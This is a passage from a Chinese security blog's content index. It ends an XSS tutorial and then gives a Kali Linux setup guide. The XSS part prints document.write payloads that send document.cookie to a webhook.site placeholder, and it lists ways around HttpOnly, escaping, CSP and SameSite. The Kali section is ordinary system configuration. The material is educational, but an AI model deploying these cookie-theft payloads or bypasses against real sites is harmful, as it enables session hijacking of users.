+<h4 id="document-write方法"><a href="#document-write方法" class="headerlink" title="document.write方法"></a><code>document.write</code>方法</h4><p>利用 <code>document.write</code> 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(`&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=$&#123;document.cookie&#125;&quot; &gt;`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.write(&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;+document.cookie+&#x27;&quot;/&gt;&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS的防范"><a href="#XSS的防范" class="headerlink" title="XSS的防范"></a>XSS的防范</h2><h3 id="HttpOnly-Cookie"><a href="#HttpOnly-Cookie" class="headerlink" title="HttpOnly Cookie"></a>HttpOnly Cookie</h3><p>设置 Cookie 为 HttpOnly，这样，JavaScript 无法 通过 <code>document.cookie</code> 访问该 Cookie，只能通过HTTP请求发送给服务器</p>
+<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CSRF (跨站请求伪造)</td>
+<td>HttpOnly 不能防止跨站请求伪造攻击（CSRF），攻击者仍可在受害者的浏览器中发起请求，利用受害者的 Cookie 进行操作</td>
+</tr>
+<tr>
+<td>XS-Leaks（跨站信息泄露）</td>
+<td>通过 <code>img</code>、<code>iframe</code>、<code>fetch()</code> 发送请求，并观察返回数据是否有差异，可能间接推测出 Cookie 值</td>
+</tr>
+<tr>
+<td>服务器端获取 Cookie</td>
+<td>通过 XSS <strong>劫持会话</strong>，让受害者访问恶意页面，然后<strong>读取本地存储的 Token</strong> 或 <strong>触发服务器端请求</strong> 来利用 Cookie</td>
+</tr>
+</tbody></table>
+<h3 id="输入验证和转义"><a href="#输入验证和转义" class="headerlink" title="输入验证和转义"></a>输入验证和转义</h3><p>输入验证：限制输入字符，只允许安全字符（如 <code>a-zA-Z0-9</code>）</p>
+<p>HTML转义：实体编码</p>
+<p>防止恶意脚本被注入到网页中</p>
+<h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>双重编码绕过</td>
+<td>有些 WAF 只转义了一次，可以尝试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 让服务器误解</td>
+</tr>
+<tr>
+<td>事件属性绕过</td>
+<td>如果 <code>&lt;script&gt;</code> 被拦截，可以尝试 <code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+</tr>
+<tr>
+<td>DOM XSS</td>
+<td>如果后端转义了，但前端用 <code>innerHTML</code> 渲染数据，仍然可以执行 XSS 代码</td>
+</tr>
+<tr>
+<td>JSON 解析漏洞</td>
+<td>JSON 可能会反序列化恶意代码，例如 <code>&#123;&quot;data&quot;: &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&#125;</code></td>
+</tr>
+</tbody></table>
+<h3 id="使用-CSP（内容安全策略）"><a href="#使用-CSP（内容安全策略）" class="headerlink" title="使用 CSP（内容安全策略）"></a>使用 CSP（内容安全策略）</h3><p>限制页面中允许执行的脚本来源，防止外部 XSS 代码注入</p>
+<h4 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h4><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JSONP 绕过</td>
+<td>某些 API 允许 <code>JSONP</code> 请求，仍可执行外部代码</td>
+</tr>
+<tr>
+<td>内联事件监听</td>
+<td><code>onclick=&quot;alert(1)&quot;</code> 可能仍然有效</td>
+</tr>
+<tr>
+<td>数据 URI 绕过</td>
+<td>某些 <code>data:</code> 方案仍然可以执行代码</td>
+</tr>
+<tr>
+<td>动态 JavaScript 执行</td>
+<td><code>eval()</code>, <code>setTimeout()</code>, <code>Function()</code> 可能仍然可以执行恶意代码</td>
+</tr>
+</tbody></table>
+<h3 id="Cookie-SameSite-属性"><a href="#Cookie-SameSite-属性" class="headerlink" title="Cookie SameSite 属性"></a>Cookie SameSite 属性</h3><p>限制 Cookie 的跨站点发送行为</p>
+<h4 id="绕过-4"><a href="#绕过-4" class="headerlink" title="绕过"></a>绕过</h4><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CORS 配合 XSS 绕过</td>
+<td>如果 <code>Access-Control-Allow-Origin: *</code>，可以用 <code>fetch()</code> 请求获取敏感数据</td>
+</tr>
+<tr>
+<td>站内跳转绕过</td>
+<td><code>SameSite=Lax</code> 允许 GET 请求，所以可以诱导用户点击链接</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/news/11816">对于XSS跨站脚本攻击的学习-先知社区</a></p>
+<p><a href="https://j0k3r.top/2019/11/19/csp-bypass/#2-%E4%BD%BF%E7%94%A8-CSP">前端安全之 CSP 及其常见绕过</a></p>
+<p><a href="https://buuoj.cn/challenges#XSS-Lab">BUUCTF上的XSS靶场</a></p>
+</blockquote>
+</div>]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>kali优化</title>
+    <url>/2025/02/05/kali%E4%BC%98%E5%8C%96/</url>
+    <content><![CDATA[<div id="postchat_postcontent"><h1 id="kali优化"><a href="#kali优化" class="headerlink" title="kali优化"></a>kali优化</h1><p><strong>kali解压打开默认密码为：kali</strong></p>
+<h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a><strong>设置中文</strong></h2><p>打开Terminal，输入命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
+
+<p>进入后使用键盘的↑+↓←，到最底部，找到 <code>[ ] zh_CN.UTF-8 UTF-8</code> ，按空格键选中，再按回车进入下一个页面，再选中 <code>zh_CN.UTF-8</code>作为默认语言，后回车</p>
+<p>等待下载结束后重启即可</p>
+<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a><strong>换源</strong></h2><p>因为官方源都是的速度慢，所以选择换国内源</p>
+<p>打开Terminal，输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+
+<p>可选的国内源</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">#阿里云源</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学源</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib</span><br><span class="line">#浙大源</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
+
+<p>不懂vim语法的按以下步骤来</p>
+<ol>
+<li><p>全选删除原本的内容</p>
+<p> 按<strong>esc键</strong>后，先按 <strong>g g</strong>（到达顶部），然后再按 <strong>d G</strong>(区分大小写！！！)</p>
+</li>
+<li><p>复制以上内容，右键粘贴</p>
+</li>
+<li><p>保存退出</p>
+<p> 按<strong>esc键</strong>后，同时按住<strong>shift</strong>键和英文:键，再输入wq</p>
+</li>
+</ol>
+<h2 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a><strong>系统优化</strong></h2><h3 id="1-设置root账户密码"><a href="#1-设置root账户密码" class="headerlink" title="1.设置root账户密码"></a>1.设置root账户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-设置禁止休眠"><a href="#2-设置禁止休眠" class="headerlink" title="2.设置禁止休眠"></a>2.设置禁止休眠</h3><ul>
+<li>打开左上角kali图标</li>
+<li>点击<code>settings(设置)</code></li>
+<li>点击进入<code>power Manger(电源管理器)</code></li>
+<li>在<code>Power Manager</code> 选择—&gt; <code>display(显示)</code><br>  把使用电池和插入电源下的依次把<code>Blank after、Put to sleep after和Switch off after</code> 全部设置成为 <code>Never</code></li>
+</ul>
+<h3 id="3-软件数据库更新："><a href="#3-软件数据库更新：" class="headerlink" title="3.软件数据库更新："></a>3.软件数据库更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-软件更新："><a href="#4-软件更新：" class="headerlink" title="4.软件更新："></a>4.软件更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-系统更新："><a href="#5-系统更新：" class="headerlink" title="5.系统更新："></a>5.系统更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
+
+<h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a><u><strong>安装中文输入法</strong></u></h2><ol>
+<li><p>更新包管理器的软件包列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装<code>fcitx</code>输入法框架：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get install fcitx</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>安装<code>fcitx-googlepinyin</code>谷歌拼音输入法：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get install fcitx-googlepinyin</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p><code>ctrl</code>+<code>space(空格)</code>切换输入法</p>
+<h2 id="界面美化"><a href="#界面美化" class="headerlink" title="界面美化"></a><strong>界面美化</strong></h2><h3 id="1-整体字体放大"><a href="#1-整体字体放大" class="headerlink" title="1.整体字体放大"></a>1.整体字体放大</h3><ul>
+<li>打开左上角kali图标</li>
+<li>点击<strong>设置</strong>进入<strong>外观</strong></li>
+<li>选择<strong>字体</strong>，修改<strong>DPI</strong></li>
+</ul>
+<h3 id="1-桌面图标大小"><a href="#1-桌面图标大小" class="headerlink" title="1.桌面图标大小"></a>1.桌面图标大小</h3><ul>
+<li>桌面<strong>右键</strong>选择<strong>桌面设置</strong></li>
+<li>选择<strong>图标</strong>，调节<strong>图标大小</strong>完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小）</li>
+</ul>
+<h3 id="2-菜单栏大小以及位置"><a href="#2-菜单栏大小以及位置" class="headerlink" title="2.菜单栏大小以及位置"></a>2.菜单栏大小以及位置</h3><ul>
+<li>在菜单栏空白处右键—选择<strong>面板</strong>再点击<strong>面板首选项</strong></li>
+<li>打开面板后选择<strong>显示</strong>—<strong>尺寸</strong>—调节<strong>行大小</strong></li>
+<li><strong>关闭锁定面板</strong>，可拖动作用两侧的小点将面板放置于最下侧</li>
+</ul>
+<h3 id="3-终端字体"><a href="#3-终端字体" class="headerlink" title="3.终端字体"></a>3.终端字体</h3><ul>
+<li>打开<strong>终端</strong>再点击左上角<strong>文件</strong>点击<strong>参数设置</strong></li>
+<li>打开<strong>设置界面</strong>，<strong>界面设置</strong>—调节<strong>字体</strong>大小</li>
+</ul>
+<h3 id="4-系统字体"><a href="#4-系统字体" class="headerlink" title="4.系统字体"></a>4.系统字体</h3><ul>
+<li>打开左上角kali图标</li>
+<li>点击<strong>设置</strong>进入<strong>外观</strong></li>
+<li>选择<strong>字体</strong>，修改<strong>默认字体</strong>和<strong>默认等宽字体</strong></li>
+</ul>
+<h3 id="4-窗口字体"><a href="#4-窗口字体" class="headerlink" title="4.窗口字体"></a>4.窗口字体</h3><ul>
+<li>打开左上角kali图标</li>
+<li>点击<strong>设置</strong>进入<strong>窗口管理器</strong></li>
+<li>选择<strong>样式</strong>修改<strong>标题字体</strong></li>
+</ul>
+<h2 id="kali-mysql登录问题"><a href="#kali-mysql登录问题" class="headerlink" title="kali mysql登录问题"></a>kali mysql登录问题</h2><p>不知用户名和密码（用root试过不行），我们自行更改root用户的密码</p>
+<p>使用 <strong><code>sudo</code></strong> 登录 MySQL：<code>sudo mysql</code></p>
+<p>确定数据库版本</p>
+<p><code>SELECT VERSION();</code></p>
+<p><strong>MariaDB版本</strong></p>
+<p>使用以下 SQL 语法来修改 <code>root</code> 用户的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET PASSWORD FOR &#x27;root&#x27;@&#x27;localhost&#x27; = PASSWORD(&#x27;your_new_password&#x27;);</span><br><span class="line">或 </span><br><span class="line">UPDATE mysql.user SET password = PASSWORD(&#x27;your_new_password&#x27;) WHERE user = &#x27;root&#x27; AND host = &#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>MySQL版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;your_new_password&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>刷新权限</p>
+<p><code>FLUSH PRIVILEGES;</code></p>
+<p>如果以上方法仍然不起作用，可能是由于权限问题。可以检查 <code>root</code> 用户的权限配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT user, host, authentication_string, plugin FROM mysql.user WHERE user=&#x27;root&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>确认 <code>root</code> 用户是否具有正确的权限，并且插件是否配置为 **<code>mysql_native_password</code>**，或者可以通过 <strong><code>unix_socket</code></strong> 来进行身份验证</p>
+<p>0.0.0.0</p>
+</div>]]></content>
+      <categories>
+        <category>kali虚拟机</category>
+      </categories>
   </entry>
   <entry>
     <title>PHP</title>
